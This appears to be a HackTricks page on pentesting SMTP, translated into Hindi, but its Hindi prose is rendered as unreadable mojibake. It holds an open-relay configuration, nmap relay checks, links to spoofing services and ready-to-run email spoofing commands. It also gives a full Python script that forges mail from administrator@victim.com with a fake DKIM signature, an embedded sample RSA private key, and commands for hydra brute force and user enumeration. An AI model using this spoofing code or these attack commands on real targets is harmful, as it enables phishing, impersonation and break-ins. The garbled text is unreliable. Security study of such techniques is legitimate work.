> рдЕрдЧрд░ рдореИрдВ pielovers.demon.co.uk рд╕реЗ рдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реВрдВ, рдФрд░ pielovers рдХреЗ рд▓рд┐рдП SPF рдбреЗрдЯрд╛ рдирд╣реАрдВ рд╣реИ, рддреЛ рдХреНрдпрд╛ рдореИрдВ рд╡рд╛рдкрд╕ рдЬрд╛рдХрд░ demon.co.uk рдХреЗ рд▓рд┐рдП SPF рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реВрдВ? рдирд╣реАрдВред рд╣рд░ рдбреЗрдорди рдХрд╛ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдбреЛрдореЗрди рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдЧреНрд░рд╛рд╣рдХ рд╣реИ, рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдЧреНрд░рд╛рд╣рдХ рдХреА рдЕрдкрдиреА рдиреАрддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рдпрд╣ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдбреЗрдорди рдХреА рдиреАрддрд┐ рдХреЛ рд╕рднреА рдЕрдкрдиреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдкрд░ рд▓рд╛рдЧреВ рдХрд░рдирд╛ рд╕рдордЭрджрд╛рд░ рдирд╣реАрдВ рд╣реЛрдЧрд╛; рдЕрдЧрд░ рдбреЗрдорди рдРрд╕рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП SPF рд░рд┐рдХреЙрд░реНрдб рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
>
> рдЗрд╕рд▓рд┐рдП SPF рдкреНрд░рдХрд╛рд╢рдХреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд▓рд╛рд╣ рдпрд╣ рд╣реИ: рдЖрдкрдХреЛ рд╣рд░ рдЙрдкрдбреЛрдореЗрди рдпрд╛ рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреЗ рд▓рд┐рдП рдПрдХ SPF рд░рд┐рдХреЙрд░реНрдб рдЬреЛрдбрд╝рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдПрдХ рдП рдпрд╛ рдПрдордПрдХреНрд╕ рд░рд┐рдХреЙрд░реНрдб рд╣реИред
>
> рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдП рдпрд╛ рдПрдордПрдХреНрд╕ рд░рд┐рдХреЙрд░реНрдб рд╡рд╛рд▓реА рд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рднреА рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб SPF рд░рд┐рдХреЙрд░реНрдб рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдХрд╛ рд░реВрдк рд╣реИ: \* IN TXT "v=spf1 -all"

рдпрд╣ рд╕рдордЭ рдореЗрдВ рдЖрддрд╛ рд╣реИ - рдПрдХ рдЙрдкрдбреЛрдореЗрди рдмрд╣реБрдд рдЕрд▓рдЧ рднреМрдЧреЛрд▓рд┐рдХ рд╕реНрдерд╛рди рдореЗрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдмрд╣реБрдд рдЕрд▓рдЧ SPF рдкрд░рд┐рднрд╛рд╖рд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

### **рдУрдкрди рд░рд┐рд▓реЗ**

рдЬрдм рдИрдореЗрд▓ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдХрд┐ рд╡реЗ рд╕реНрдкреИрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд┐рд╣реНрдирд┐рдд рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдпрд╣ рдЕрдХреНрд╕рд░ **рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдорд╛рдирд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд░рд┐рд▓реЗ рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЪреБрдиреМрддреА рдпрд╣ рд╣реИ рдХрд┐ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдкрддрд╛ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рдХрд┐ рдХреМрди рд╕реЗ **рдЖрдИрдкреА рд╕реАрдорд╛рдПрдВ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП**ред рдЗрд╕ рд╕рдордЭ рдХреА рдХрдореА рд╕реЗ SMTP рд╕рд░реНрд╡рд░ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рдЧрд▓рддрд┐рдпрд╛рдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрдиреЛрдВ рдореЗрдВ рдЕрдХреНрд╕рд░ рдкрд╣рдЪрд╛рдиреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдПрдХ рдЬреЛрдЦрд┐рдо рд╣реИред

рдХреБрдЫ рдкреНрд░рд╢рд╛рд╕рдХ рдИрдореЗрд▓ рд╡рд┐рддрд░рдг рд╕рдорд╕реНрдпрд╛рдУрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖рдХрд░ рд╕рдВрднрд╛рд╡рд┐рдд рдпрд╛ рдЪрд▓ рд░рд╣реЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ, **рдХрд┐рд╕реА рднреА рдЖрдИрдкреА рдкрддреЗ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдпрд╣ рдПрдХреНрд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП SMTP рд╕рд░реНрд╡рд░ рдХреА `mynetworks` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╕рднреА рдЖрдИрдкреА рдкрддреЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
mynetworks = 0.0.0.0/0
```
рдПрдХ рдореЗрд▓ рд╕рд░реНрд╡рд░ рдХреЛ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рд╡рд╣ рдПрдХ рдУрдкрди рд░рд┐рд▓реЗ рд╣реИ (рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рдХрд┐рд╕реА рднреА рдмрд╛рд╣рд░реА рд╕реНрд░реЛрдд рд╕реЗ рдИрдореЗрд▓ рдлреЙрд░рд╡рд░реНрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ), `nmap` рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдорддреМрд░ рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдЗрд╕реЗ рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╢рд╛рдорд┐рд▓ рд╣реИред `nmap` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд░реНрд╡рд░ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдИрдкреА 10.10.10.10) рдкрд░ рдкреЛрд░реНрдЯ 25 рдкрд░ рдПрдХ рд╡рд░реНрдмреЛрд╕ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рд╣реИ:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **рдЙрдкрдХрд░рдг**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **SPF рдФрд░ DMARC рдорд┐рд╕рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ SPF рдФрд░ DMARC рдХреЙрдиреНрдлрд╝рд┐рдЧреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**

### рдзреЛрдЦрд╛рдзрдбрд╝реА рдИрдореЗрд▓ рднреЗрдЬреЗрдВ

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)

**рдпрд╛ рдЖрдк рдПрдХ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
рдпрджрд┐ рдЖрдк **dkim python lib** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдХрд┐рд╕реА **рддреНрд░реБрдЯрд┐** рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдХреБрдВрдЬреА рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рдореЗрдВ рд╕рдорд╕реНрдпрд╛ рдЖ рд░рд╣реА рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╕реНрд╡рддрдВрддреНрд░ рдорд╣рд╕реВрд╕ рдХрд░реЗрдВред\
**рдзреНрдпрд╛рди рджреЗрдВ**: рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ рдЬрд▓реНрджреА рд╕реЗ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧрдВрджрд╛ рд╕реБрдзрд╛рд░ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ openssl рдирд┐рдЬреА рдХреБрдВрдЬреА **dkim рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░реНрд╕ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ**ред
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**рдпрд╛ рдЖрдк рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рддрд░реАрдХреЗ рд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># рдпрд╣ рдПрдХ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕рдВрджреЗрд╢ рднреЗрдЬреЗрдЧрд╛
</strong><strong>mail("your_email@gmail.com", "рдкрд░реАрдХреНрд╖рдг рд╡рд┐рд╖рдп!", "рд╣реЗ! рдпрд╣ рдПрдХ рдкрд░реАрдХреНрд╖рдг рд╣реИ", "рд╕реЗ: administrator@victim.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

**рдЗрди рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛рдПрдВ** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **рдЕрдиреНрдп рдлрд┐рд╢рд┐рдВрдЧ рд╕рдВрдХреЗрдд**

* рдбреЛрдореЗрди рдХреА рдЙрдореНрд░
* рдЖрдИрдкреА рдкрддреЗ рдкрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрддреЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд▓рд┐рдВрдХ
* рд▓рд┐рдВрдХ рдореИрдирд┐рдкреБрд▓реЗрд╢рди рддрдХрдиреАрдХреЗрдВ
* рд╕рдВрджреЗрд╣рд╛рд╕реНрдкрдж (рдЕрд╕рд╛рдорд╛рдиреНрдп) рдЕрдЯреИрдЪрдореЗрдВрдЯреНрд╕
* рдЯреВрдЯреА рд╣реБрдИ рдИрдореЗрд▓ рд╕рд╛рдордЧреНрд░реА
* рдореЗрд▓ рд╣реЗрдбрд░реНрд╕ рдХреЗ рдЙрд╕рдХреЗ рдЕрд▓рдЧ рдореВрд▓реНрдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ
* рдорд╛рдиреНрдп рдФрд░ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрд╕рдПрд╕рдПрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдореМрдЬреВрджрдЧреА
* рдкреГрд╖реНрда рдХреЛ рд╡реЗрдм рд╕рд╛рдордЧреНрд░реА рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рд╕рд╛рдЗрдЯреЛрдВ рдкрд░ рд╕рдмрдорд┐рд╢рди

## SMTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд╕реА

**рдЕрдЧрд░ рдЖрдк SMTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** [**рдпрд╣ рдкрдврд╝реЗрдВ**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**.**

## рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓

### Postfix

рд╕рд╛рдорд╛рдиреНрдпрдд: рдЕрдЧрд░ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рддреЛ `/etc/postfix/master.cf` рдореЗрдВ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реЛрддреА рд╣реИрдВ** рдЬреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЬрдм рдПрдХ рдирдП рдореЗрд▓ рдХреЛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреЗ рд▓рд┐рдП. рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдкрдВрдХреНрддрд┐ `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` рдпрд╣ рджрд░реНрд╢рд╛рддреА рд╣реИ рдХрд┐ рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдорд╛рд░реНрдХ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдирдпрд╛ рдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ `/etc/postfix/filtering` рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЕрдиреНрдп рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ:
```
sendmail.cf
submit.cf
```
## рд╕рдВрджрд░реНрдн

* [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
* [https://www.reddit.com/r/HowToHack/comments/101it4u/what\_could\_hacker\_do\_with\_misconfigured\_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what\_could\_hacker\_do\_with\_misconfigured\_smtp/)

## HackTricks рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрдорд╛рдВрдб
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╕реЗрдЯрдЕрдк рд╡реНрдпрдХреНрддрд┐рдЧрддрддрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдФрд░ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП**ред 20+ рдЯреВрд▓ рдФрд░ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдХрд╣реАрдВ рд╕реЗ рднреА рдкреВрд░реНрдг рдкреЗрдирдЯреЗрд╕реНрдЯ рдЪрд▓рд╛рдПрдВ рдЬреЛ рдкреБрдирд░реАрдХреНрд╖рдг рд╕реЗ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рддрдХ рдЬрд╛рддреЗ рд╣реИрдВред рд╣рдо рдкреЗрдирдЯреЗрд╕реНрдЯрд░реНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВ - рд╣рдо рдЙрдиреНрд╣реЗрдВ рд╡рд╛рдкрд╕ рдХреБрдЫ рд╕рдордп рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рдЯреВрд▓, рдкрд╣рдЪрд╛рди рдФрд░ рд╢реЛрд╖рдг рдореЙрдбреНрдпреВрд▓ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдЧрд╣рд░рд╛рдИ рдореЗрдВ рдЦреЛрдЬ рдХрд░ рд╕рдХреЗрдВ, рд╢реИрд▓реНрд╕ рдкреЙрдк рдХрд░ рд╕рдХреЗрдВ, рдФрд░ рдордЬрд╝рд╛ рдХрд░ рд╕рдХреЗрдВред

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
